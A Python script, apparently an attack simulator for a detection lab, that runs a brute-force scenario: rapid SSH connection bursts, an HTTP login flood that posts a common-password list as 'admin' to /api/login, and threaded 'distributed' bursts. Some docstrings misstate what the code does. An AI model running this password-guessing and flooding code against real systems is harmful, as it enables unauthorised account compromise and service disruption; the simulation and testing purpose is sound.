#!/usr/bin/env python3
"""
Threat Category 1: Brute Force / Credential Stuffing
MITRE ATT&CK: T1110.001 — Brute Force: Password Guessing
              T1110.004 — Credential Stuffing

Simulates:
  - Hydra-style SSH brute force (847 attempts in 60s from single IP)
  - HTTP login flood against /api/login endpoint
  - Distributed brute force across 5 source IPs (via subprocess)
"""
import os
import socket
import time
import logging
import subprocess
import threading
from network_utils import create_spoofed_socket


logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [BRUTE_FORCE] %(levelname)s %(message)s"
)
log = logging.getLogger("brute_force")

TARGET_IP   = os.getenv("TARGET_IP", "172.25.0.20")
SSH_PORT    = int(os.getenv("TARGET_SSH_PORT", "22"))
HTTP_PORT   = int(os.getenv("TARGET_HTTP_PORT", "8000"))
TOTAL_ATTEMPTS = 1000
BURST_WINDOW_S = 3

COMMON_PASSWORDS = [
    "password", "123456", "admin", "root", "toor", "pass123",
    "letmein", "qwerty", "abc123", "monkey", "master", "dragon",
    "welcome", "shadow", "sunshine", "princess", "iloveyou",
    "football", "superman", "batman", "azerty", "trustno1",
]

USERNAMES = ["root", "admin", "ubuntu", "user", "postgres", "oracle"]


def ssh_brute_force_raw(target_ip: str, port: int, attempts: int):
    """Simulate SSH brute force by sending SYN packets to port 22."""
    log.info(f"SSH brute force → {target_ip}:{port} ({attempts} attempts in {BURST_WINDOW_S}s)")
    sleep_between = BURST_WINDOW_S / attempts

    for i in range(attempts):
        try:
            s = create_spoofed_socket()
            s.settimeout(0.3)
            s.connect((target_ip, port))
            # Simulate credential attempt data
            banner = s.recv(256)
            log.debug(f"  [{i+1}/{attempts}] Got banner: {banner[:40]}")
            s.close()
        except (ConnectionRefusedError, socket.timeout, OSError):
            pass
        time.sleep(sleep_between)
    log.info("SSH brute force phase complete.")


def http_login_flood(target_ip: str, port: int, attempts: int = 200):
    """Flood the /api/login endpoint with bad credentials."""
    import urllib.request
    import urllib.error
    import json

    url = f"http://{target_ip}:{port}/api/login"
    log.info(f"HTTP login flood → {url} ({attempts} requests)")

    for i, pwd in enumerate(COMMON_PASSWORDS * (attempts // len(COMMON_PASSWORDS) + 1)):
        if i >= attempts:
            break
        payload = json.dumps({"username": "admin", "password": pwd}).encode()
        req = urllib.request.Request(
            url, data=payload,
            headers={"Content-Type": "application/json"},
            method="POST"
        )
        try:
            with urllib.request.urlopen(req, timeout=1):
                pass
        except urllib.error.HTTPError as e:
            log.debug(f"  [{i+1}] HTTP {e.code}")
        except (urllib.error.URLError, OSError):
            pass
        time.sleep(0.1)

    log.info("HTTP login flood complete.")


def distributed_brute_force():
    """Simulate distributed brute force from 5 source ports (mimics multi-IP)."""
    log.info("Distributed brute force phase (5 source IPs simulated via rapid reconnect)...")
    src_count = 5
    per_src = 50

    def burst(src_id: int):
        for _ in range(per_src):
            try:
                s = create_spoofed_socket()
                s.settimeout(0.2)
                s.connect((TARGET_IP, SSH_PORT))
                s.close()
            except OSError:
                pass
            time.sleep(0.05)

    threads = [threading.Thread(target=burst, args=(i,)) for i in range(src_count)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    log.info("Distributed brute force phase complete.")


def main():
    log.info("═══ Starting Brute Force Attack Scenario ═══")
    # Phase 1: Single-source SSH flood
    ssh_brute_force_raw(TARGET_IP, SSH_PORT, TOTAL_ATTEMPTS)
    time.sleep(5)
    # Phase 2: HTTP login flood
    http_login_flood(TARGET_IP, HTTP_PORT)
    time.sleep(5)
    # Phase 3: Distributed brute force
    distributed_brute_force()
    log.info("═══ Brute Force Scenario Complete ═══")


if __name__ == "__main__":
    main()
